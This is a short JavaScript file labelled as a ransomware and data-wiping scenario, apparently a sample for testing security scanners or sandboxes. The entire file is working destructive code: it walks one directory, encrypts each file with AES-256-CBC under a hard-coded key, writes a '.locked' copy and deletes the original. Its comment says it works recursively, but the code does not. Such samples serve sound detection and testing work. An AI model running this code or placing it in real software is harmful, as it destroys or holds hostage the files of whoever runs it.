// Scenario: Ransomware/Data Wiping
// Attempts to recursively encrypt or delete files
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

function encryptFile(filePath) {
  const data = fs.readFileSync(filePath);
  const cipher = crypto.createCipher('aes-256-cbc', 'malicious-key');
  const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  fs.writeFileSync(filePath + '.locked', encrypted);
  fs.unlinkSync(filePath);
}

export function startEncryption(dir) {
  const files = fs.readdirSync(dir);
  files.forEach((file) => {
    const fullPath = path.join(dir, file);
    if (fs.statSync(fullPath).isFile()) {
      encryptFile(fullPath);
    }
  });
}
